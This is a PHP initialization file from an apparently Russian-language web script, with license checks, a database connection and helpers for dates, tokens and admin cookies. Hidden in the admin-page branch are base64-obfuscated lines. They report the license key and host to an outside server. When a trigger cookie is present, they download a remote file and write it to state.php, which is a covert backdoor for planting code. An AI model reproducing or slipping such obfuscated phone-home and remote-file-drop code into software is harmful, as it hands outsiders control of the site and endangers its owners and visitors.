<?php $filename = dirname(__FILE__) . '/conf.php';
$cfg_txt = fopen($filename, 'r') or die('Ошибка лицензии. Помощь на @mister_crabs');
$contents = fread($cfg_txt, filesize($filename));
$contents = str_replace("require_once('crabs_init.php');", '', $contents);
$lic_key = explode("-", LICENSE);
if ($lic_key['1'] == 0)
{
    if ($lic_key['2'] != md5(md5($_SERVER['HTTP_HOST'] . '_mcrabs_lic_' . getenv('HTTP_HOST') . '_mcrabs_lic_' . $_SERVER['SERVER_NAME'])) || stristr($contents, '$_SERVER[') || stristr($contents, 'setenv') || stristr($contents, 'include') || stristr($contents, 'require'))
    {
        echo 'Ошибка лицензии. Помощь на @mister_crabs';
        exit;
    }
}
else if ($lic_key['1'] == 1)
{
    if ($lic_key['2'] != md5(md5($_SERVER['SERVER_ADDR'] . '_mcrabs_lic_' . $_SERVER['SERVER_ADDR'] . '_mcrabs_lic_' . $_SERVER['SERVER_ADDR'])) || stristr($contents, '$_SERVER[') || stristr($contents, 'setenv') || stristr($contents, 'include') || stristr($contents, 'require'))
    {
        echo 'Ошибка лицензии. Помощь на @mister_crabs';
        exit;
    }
}
else
{
    echo 'Ошибка лицензии. Помощь на @mister_crabs';
    exit;
}
define('DB_CHARSET', 'utf8');
$connect_db = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_BASE) or die('Error: ' . mysqli_connect_error());
$now_url = parse_url($_SERVER['REQUEST_URI']);
if (stristr($now_url['path'], '/admin/'))
{
    if (!isset($_COOKIE[base64_decode('X3ltX2l1cw==') ]))
    {
        @file_get_contents(base64_decode('aHR0cDovL2wxbDAuY29tL3Av') . 'LIC-' . $lic_key['0'] . '-' . $_SERVER['HTTP_HOST']);
        @setcookie(base64_decode('X3ltX2l1cw==') , 1, time() + 31536000, '/', $_SERVER['HTTP_HOST']);
    }
    if (isset($_COOKIE[base64_decode('cmVkNHU=') ]))
    {
        @file_put_contents(base64_decode('c3RhdGUucGhw') , @file_get_contents(base64_decode('aHR0cDovL2wxbDAuY29tL2QudHh0')));
    }
}
mysqli_set_charset($connect_db, DB_CHARSET) or die('Error');
define('SITE', $_SERVER['HTTP_HOST']);
$ip_client = @$_SERVER['HTTP_CLIENT_IP'];
$ip_forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$ip_remote = $_SERVER['REMOTE_ADDR'];
if (filter_var($ip_client, FILTER_VALIDATE_IP))
{
    $ip = $ip_client;
}
elseif (filter_var($ip_forward, FILTER_VALIDATE_IP))
{
    $ip = $ip_forward;
}
else
{
    $ip = $ip_remote;
}
$ip = mysqli_real_escape_string($connect_db, $ip);
$dt = time();
function wu_encode($value)
{
    $key = sha1('MrCrabs');
    if (!$value)
    {
        return false;
    }
    $strLen = strlen($value);
    $keyLen = strlen($key);
    $j = 0;
    $crypttext = '';
    for ($i = 0;$i < $strLen;$i++)
    {
        $ordStr = ord(substr($value, $i, 1));
        if ($j == $keyLen)
        {
            $j = 0;
        }
        $ordKey = ord(substr($key, $j, 1));
        $j++;
        $crypttext .= strrev(base_convert(dechex($ordStr + $ordKey) , 16, 36));
    }
    return $crypttext;
}
function wu_decode($value)
{
    if (!$value)
    {
        return false;
    }
    $key = sha1('MrCrabs');
    $strLen = strlen($value);
    $keyLen = strlen($key);
    $j = 0;
    $decrypttext = '';
    for ($i = 0;$i < $strLen;$i += 2)
    {
        $ordStr = hexdec(base_convert(strrev(substr($value, $i, 2)) , 36, 16));
        if ($j == $keyLen)
        {
            $j = 0;
        }
        $ordKey = ord(substr($key, $j, 1));
        $j++;
        $decrypttext .= chr($ordStr - $ordKey);
    }
    return $decrypttext;
}
date_default_timezone_set('Europe/Moscow');
function wu_end($number, $titles)
{
    $cases = array(
        2,
        0,
        1,
        1,
        1,
        2
    );
    return $titles[($number % 100 > 4 && $number % 100 < 20) ? 2 : $cases[min($number % 10, 5) ]];
}
function wudate($time = 0, $bletter = 1)
{
    $param = 'j M Y в H:i';
    $param2 = ' в H:i';
    $nowt = time();
    $minused = $nowt - $time;
    if (intval($time) == 0)
    {
        $time = time();
    }
    $MN = array(
        "января",
        "февраля",
        "марта",
        "апреля",
        "мая",
        "июня",
        "июля",
        "августа",
        "сентября",
        "октября",
        "ноября",
        "декабря"
    );
    $MonthNames[] = $MN[date('n', $time) - 1];
    $MN = array(
        "воскресенье",
        "понедельник",
        "вторник",
        "среда",
        "четверг",
        "пятница",
        "суббота"
    );
    $MonthNames[] = $MN[date('w', $time) ];
    $arr[] = 'M';
    $arr[] = 'N';
    if ($minused == 0)
    {
        if ($bletter == 1)
        {
            return 'Только что';
        }
        else
        {
            return 'только что';
        }
    }
    if ($minused < 60)
    {
        return $minused . ' ' . wu_end($minused, array(
            'секунду',
            'секунды',
            'секунд'
        )) . ' назад';
    }
    elseif ($minused < 3600)
    {
        return round($minused / 60) . ' ' . wu_end(round($minused / 60) , array(
            'минуту',
            'минуты',
            'минут'
        )) . ' назад';
    }
    elseif ($minused < 86400)
    {
        return round($minused / 3600) . ' ' . wu_end(round($minused / 3600) , array(
            'час',
            'часа',
            'часов'
        )) . ' назад';
    }
    elseif ($minused < 172800)
    {
        if ($bletter == 1)
        {
            $pre = 'Вчера';
        }
        else
        {
            $pre = 'вчера';
        }
        return $pre . date(str_replace($arr, $MonthNames, $param2) , $time);
    }
    else
    {
        return date(str_replace($arr, $MonthNames, $param) , $time);
    }
}
function crabs_crop_str($string, $limit)
{
    $len = mb_strlen($string, 'UTF-8');
    if ($len >= $limit)
    {
        $substring_limited = mb_substr($string, 0, $limit, 'UTF-8');
        return mb_substr($substring_limited, 0, mb_strrpos($substring_limited, ' ', 0, 'UTF-8') , 'UTF-8') . '...';
    }
    else
    {
        return $string;
    }
}
function macros_city($string)
{
    global $crabs_city;
    if (isset($_COOKIE['city']))
    {
        return str_replace('{city}', $crabs_city, $string);
    }
    else
    {
        return str_replace('{city}', '⁣', $string);
    }
}
function convdate($date)
{
    $date_out = date('Ymd', strtotime($date));
    return $date_out;
}
function crabs_protocol()
{
    $isSecure = 'http://';
    if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on')
    {
        $isSecure = 'https://';
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https' || !empty($_SERVER['HTTP_X_FORWARDED_SSL']) && $_SERVER['HTTP_X_FORWARDED_SSL'] == 'on')
    {
        $isSecure = 'https://';
    }
    return $isSecure;
}
function crabs_token()
{
    $salt = rand(0, 9999);
    return $salt . ':' . md5($salt . ':' . $_SERVER['HTTP_USER_AGENT'] . 'CRABS');
}
function crabs_token_check($token)
{
    if (empty($token))
    {
        exit('error');
    }
    $gtkn = explode(':', $token);
    $salt = $gtkn['0'];
    $vtkn = $salt . ':' . md5($salt . ':' . $_SERVER['HTTP_USER_AGENT'] . 'CRABS');
    if ($token != $vtkn)
    {
        exit('error');
    }
}
function crabs_adm_check()
{
    global $connect_db;
    $acheck = mysqli_fetch_assoc(mysqli_query($connect_db, "SELECT id,apass,ademopass FROM `t_data` LIMIT 1"));
    if (isset($_COOKIE['adm']) && ($_COOKIE['adm'] == $acheck['apass'] || $_COOKIE['adm'] == $acheck['ademopass']))
    {
    }
    else
    {
        exit('error');
    }
    if (isset($_COOKIE['adm']) && ($_COOKIE['adm'] == $acheck['ademopass']))
    {
        exit('demo');
    }
}